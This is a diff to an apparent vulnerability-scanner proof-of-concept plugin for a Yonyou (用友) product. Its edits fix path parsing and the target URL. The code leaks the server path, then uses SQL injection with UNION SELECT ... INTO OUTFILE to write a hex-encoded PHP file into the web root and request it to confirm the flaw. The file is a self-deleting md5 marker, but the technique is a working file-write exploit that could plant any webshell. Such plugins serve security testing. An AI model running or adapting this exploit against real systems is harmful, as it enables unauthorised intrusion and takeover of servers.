@@ -17,7 +17,7 @@ class Vuln(ABVuln):
     ref = 'Unknown'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
-    product = '用友'  # 漏洞应用名称
+    product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
 class Poc(ABPoc):
@@ -39,12 +39,12 @@ class Poc(ABPoc):
             for payload in payloads:
                 url = self.target + payload
                 code1, head1, res1, errcode1, _url1 = hh.http(url+'%cc')
-                m = re.findall('<b>(.*?)</b>', res1)
-                shell_path = str(os.path.dirname(m[1])) + '\\testvul.php'
+                m = re.findall('<b>(.*?)</b>', res1)[1] if re.findall('<b>(.*?)</b>', res1) else ""
+                shell_path = str(os.path.dirname(m)) + '\\testvul.php'
                 shell_path = re.sub(r'\\',r'\\\\',shell_path)
                 exp_code = "'%20and%201=2%20union%20select%200x3c3f706870206563686f206d64352831293b756e6c696e6b285f5f46494c455f5f293b3f3e%20into%20outfile%20'{}'%23".format(shell_path)
                 code2, head2, res2, errcode2, _url2 = hh.http(url + exp_code)
-                code3, head3, res3, errcode3, _url3 = hh.http(arg + '/Server/testvul.php')
+                code3, head3, res3, errcode3, _url3 = hh.http(url + '/Server/testvul.php')
                 if code3 == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res3: 
                     #security_hole(url)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
